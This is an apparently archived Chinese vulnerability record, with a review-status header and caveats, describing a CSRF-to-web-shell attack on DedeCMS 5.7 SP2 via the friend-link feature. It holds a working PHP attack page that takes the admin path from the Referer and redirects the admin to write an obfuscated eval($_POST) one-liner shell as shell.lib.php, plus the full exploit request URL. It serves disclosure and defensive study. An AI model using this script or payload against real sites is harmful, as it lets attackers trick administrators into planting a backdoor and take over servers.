---
source: "白阁文库 BaizeSec/bylibrary"
product: "DedeCMS"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "DedeCMS_v5.7_友情链接CSRF_GetShell"
prerequisites: "来源所述条件，未列明部分仍待核：5.7SP2 dated2017-03-15; attacker submits friendlink; admin clicks it; full Referer and cross-site session available; no token check in tested build"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-d2c4e586c5c558d5622a88dc"
entity_id: "ve-d2c4e586c5c558d5622a88dc"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：5.7SP2 dated2017-03-15; attacker submits friendlink; admin clicks it; full Referer and cross-site session available; no token check in tested build

- **凭据与会话边界（1）**：Shares savetagfile sink with index54 but54 explicitly requires CSRF token; retain version/build difference, not merge as same proof。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **结论使用边界（2）**：Current browser Referrer-Policy may omit backend path; prerequisite absent。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（3）**：UTF8 heading vs GBK example path; exact build important。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（4）**：Clear external redirect PoC and original reference。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# DedeCMS_v5.7_友情链接CSRF_GetShell

## Affected Version

DedeCMS-V5.7-UTF8-SP2  （ 发布日期  2017-03-15 ）

下载地址： 链接: https://pan.baidu.com/s/1bprjPx1 密码: mwdq


## PoC

该版本在新建&修改标签功能（可以写PHP文件到本地）存在CSRF漏洞，通过申请友情链接的方式，诱使管理员点击，从而从 Referer 中拿到 后台路径，进而以管理员的身份写一句话到服务器上 GetShell 。

测试：

1. 申请友链

![](./.resource/DedeCMS_v5.7_友情链接CSRF_GetShell/media/apply.png)

2. 编辑 友链 信息

![](./.resource/DedeCMS_v5.7_友情链接CSRF_GetShell/media/edit.png)

dedecms_csrf.php 的内容如下：

    <?php
    $referer = $_SERVER['HTTP_REFERER'];
    $dede_login = str_replace("friendlink_main.php","",$referer);//去掉friendlink_main.php，取得dede后台的路径
    $muma = '<'.'?'.'@'.'e'.'v'.'a'.'l'.'('.'$'.'_'.'P'.'O'.'S'.'T'.'['.'\''.'c'.'\''.']'.')'.';'.'?'.'>';
    $exp = 'tpl.php?action=savetagfile&actiondo=addnewtag&content='. $muma .'&filename=shell.lib.php';
    $url = $dede_login.$exp;
    header("location: ".$url);
    exit();

3. 管理员登陆后台后 对 友链进行审核

![](./.resource/DedeCMS_v5.7_友情链接CSRF_GetShell/media/link_list.png)

4. 审核的时候一般都会点击 地址 看一下网站的内容，由于友链中使用了header 跳转，所以结果其实是访问了 `http://localhost/DedeCMS/DedeCMS-V5.7-GBK-SP2-20170315/uploads/dede/tpl.php?action=savetagfile&actiondo=addnewtag&content=%3C?@eval($_POST[%27c%27]);?%3E&filename=shell.lib.php` 请求。

![](./.resource/DedeCMS_v5.7_友情链接CSRF_GetShell/media/click_res.png)

5. 查看写入到服务器的一句话 `shell.lib.php`

![](./.resource/DedeCMS_v5.7_友情链接CSRF_GetShell/media/shell.png)

## References

1. http://0day5.com/archives/4209/


---

> 来源：白阁文库 BaizeSec/bylibrary
